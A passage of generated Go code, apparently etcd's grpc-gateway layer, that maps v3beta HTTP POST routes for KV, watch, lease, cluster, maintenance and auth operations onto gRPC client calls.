	mux.Handle("POST", pattern_KV_Txn_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_KV_Txn_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_KV_Txn_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_KV_Compact_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_KV_Compact_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_KV_Compact_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_KV_Range_0       = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "kv", "range"}, ""))
	pattern_KV_Put_0         = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "kv", "put"}, ""))
	pattern_KV_DeleteRange_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "kv", "deleterange"}, ""))
	pattern_KV_Txn_0         = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "kv", "txn"}, ""))
	pattern_KV_Compact_0     = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "kv", "compaction"}, ""))
)
var (
	forward_KV_Range_0       = runtime.ForwardResponseMessage
	forward_KV_Put_0         = runtime.ForwardResponseMessage
	forward_KV_DeleteRange_0 = runtime.ForwardResponseMessage
	forward_KV_Txn_0         = runtime.ForwardResponseMessage
	forward_KV_Compact_0     = runtime.ForwardResponseMessage
)

func RegisterWatchHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterWatchHandler(ctx, mux, conn)
}
func RegisterWatchHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterWatchHandlerClient(ctx, mux, etcdserverpb.NewWatchClient(conn))
}
func RegisterWatchHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.WatchClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_Watch_Watch_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Watch_Watch_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Watch_Watch_0(ctx, mux, outboundMarshaler, w, req, func() (proto.Message, error) {
			return resp.Recv()
		}, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_Watch_Watch_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1}, []string{"v3beta", "watch"}, ""))
)
var (
	forward_Watch_Watch_0 = runtime.ForwardResponseStream
)

func RegisterLeaseHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterLeaseHandler(ctx, mux, conn)
}
func RegisterLeaseHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterLeaseHandlerClient(ctx, mux, etcdserverpb.NewLeaseClient(conn))
}
func RegisterLeaseHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.LeaseClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_Lease_LeaseGrant_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Lease_LeaseGrant_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Lease_LeaseGrant_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Lease_LeaseRevoke_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Lease_LeaseRevoke_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Lease_LeaseRevoke_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Lease_LeaseKeepAlive_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Lease_LeaseKeepAlive_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Lease_LeaseKeepAlive_0(ctx, mux, outboundMarshaler, w, req, func() (proto.Message, error) {
			return resp.Recv()
		}, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Lease_LeaseTimeToLive_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Lease_LeaseTimeToLive_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Lease_LeaseTimeToLive_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Lease_LeaseLeases_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Lease_LeaseLeases_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Lease_LeaseLeases_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_Lease_LeaseGrant_0      = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "lease", "grant"}, ""))
	pattern_Lease_LeaseRevoke_0     = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "kv", "lease", "revoke"}, ""))
	pattern_Lease_LeaseKeepAlive_0  = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "lease", "keepalive"}, ""))
	pattern_Lease_LeaseTimeToLive_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "kv", "lease", "timetolive"}, ""))
	pattern_Lease_LeaseLeases_0     = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "kv", "lease", "leases"}, ""))
)
var (
	forward_Lease_LeaseGrant_0      = runtime.ForwardResponseMessage
	forward_Lease_LeaseRevoke_0     = runtime.ForwardResponseMessage
	forward_Lease_LeaseKeepAlive_0  = runtime.ForwardResponseStream
	forward_Lease_LeaseTimeToLive_0 = runtime.ForwardResponseMessage
	forward_Lease_LeaseLeases_0     = runtime.ForwardResponseMessage
)

func RegisterClusterHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterClusterHandler(ctx, mux, conn)
}
func RegisterClusterHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterClusterHandlerClient(ctx, mux, etcdserverpb.NewClusterClient(conn))
}
func RegisterClusterHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.ClusterClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_Cluster_MemberAdd_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Cluster_MemberAdd_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Cluster_MemberAdd_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Cluster_MemberRemove_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Cluster_MemberRemove_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Cluster_MemberRemove_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Cluster_MemberUpdate_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Cluster_MemberUpdate_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Cluster_MemberUpdate_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Cluster_MemberList_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Cluster_MemberList_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Cluster_MemberList_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_Cluster_MemberAdd_0    = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "cluster", "member", "add"}, ""))
	pattern_Cluster_MemberRemove_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "cluster", "member", "remove"}, ""))
	pattern_Cluster_MemberUpdate_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "cluster", "member", "update"}, ""))
	pattern_Cluster_MemberList_0   = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2, 2, 3}, []string{"v3beta", "cluster", "member", "list"}, ""))
)
var (
	forward_Cluster_MemberAdd_0    = runtime.ForwardResponseMessage
	forward_Cluster_MemberRemove_0 = runtime.ForwardResponseMessage
	forward_Cluster_MemberUpdate_0 = runtime.ForwardResponseMessage
	forward_Cluster_MemberList_0   = runtime.ForwardResponseMessage
)

func RegisterMaintenanceHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterMaintenanceHandler(ctx, mux, conn)
}
func RegisterMaintenanceHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterMaintenanceHandlerClient(ctx, mux, etcdserverpb.NewMaintenanceClient(conn))
}
func RegisterMaintenanceHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.MaintenanceClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_Maintenance_Alarm_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_Alarm_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_Alarm_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_Status_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_Status_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_Status_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_Defragment_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_Defragment_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_Defragment_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_Hash_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_Hash_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_Hash_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_HashKV_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_HashKV_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_HashKV_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_Snapshot_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_Snapshot_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_Snapshot_0(ctx, mux, outboundMarshaler, w, req, func() (proto.Message, error) {
			return resp.Recv()
		}, mux.GetForwardResponseOptions()...)
	})
	mux.Handle("POST", pattern_Maintenance_MoveLeader_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
		inboundMarshaler, outboundMarshaler := runtime.MarshalerForRequest(mux, req)
		rctx, err := runtime.AnnotateContext(ctx, mux, req)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		resp, md, err := request_Maintenance_MoveLeader_0(rctx, inboundMarshaler, client, req, pathParams)
		ctx = runtime.NewServerMetadataContext(ctx, md)
		if err != nil {
			runtime.HTTPError(ctx, mux, outboundMarshaler, w, req, err)
			return
		}
		forward_Maintenance_MoveLeader_0(ctx, mux, outboundMarshaler, w, req, resp, mux.GetForwardResponseOptions()...)
	})
	return nil
}

var (
	pattern_Maintenance_Alarm_0      = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "alarm"}, ""))
	pattern_Maintenance_Status_0     = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "status"}, ""))
	pattern_Maintenance_Defragment_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "defragment"}, ""))
	pattern_Maintenance_Hash_0       = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "hash"}, ""))
	pattern_Maintenance_HashKV_0     = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "hash"}, ""))
	pattern_Maintenance_Snapshot_0   = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "snapshot"}, ""))
	pattern_Maintenance_MoveLeader_0 = runtime.MustPattern(runtime.NewPattern(1, []int{2, 0, 2, 1, 2, 2}, []string{"v3beta", "maintenance", "transfer-leadership"}, ""))
)
var (
	forward_Maintenance_Alarm_0      = runtime.ForwardResponseMessage
	forward_Maintenance_Status_0     = runtime.ForwardResponseMessage
	forward_Maintenance_Defragment_0 = runtime.ForwardResponseMessage
	forward_Maintenance_Hash_0       = runtime.ForwardResponseMessage
	forward_Maintenance_HashKV_0     = runtime.ForwardResponseMessage
	forward_Maintenance_Snapshot_0   = runtime.ForwardResponseStream
	forward_Maintenance_MoveLeader_0 = runtime.ForwardResponseMessage
)

func RegisterAuthHandlerFromEndpoint(ctx context.Context, mux *runtime.ServeMux, endpoint string, opts []grpc.DialOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn, err := grpc.Dial(endpoint, opts...)
	if err != nil {
		return err
	}
	defer func() {
		if err != nil {
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
			return
		}
		go func() {
			<-ctx.Done()
			if cerr := conn.Close(); cerr != nil {
				grpclog.Printf("Failed to close conn to %s: %v", endpoint, cerr)
			}
		}()
	}()
	return RegisterAuthHandler(ctx, mux, conn)
}
func RegisterAuthHandler(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return RegisterAuthHandlerClient(ctx, mux, etcdserverpb.NewAuthClient(conn))
}
func RegisterAuthHandlerClient(ctx context.Context, mux *runtime.ServeMux, client etcdserverpb.AuthClient) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mux.Handle("POST", pattern_Auth_AuthEnable_0, func(w http.ResponseWriter, req *http.Request, pathParams map[string]string) {
		ctx, cancel := context.WithCancel(req.Context())
		defer cancel()
		if cn, ok := w.(http.CloseNotifier); ok {
			go func(done <-chan struct{}, closed <-chan bool) {
				select {
				case <-done:
				case <-closed:
					cancel()
				}
			}(ctx.Done(), cn.CloseNotify())
		}
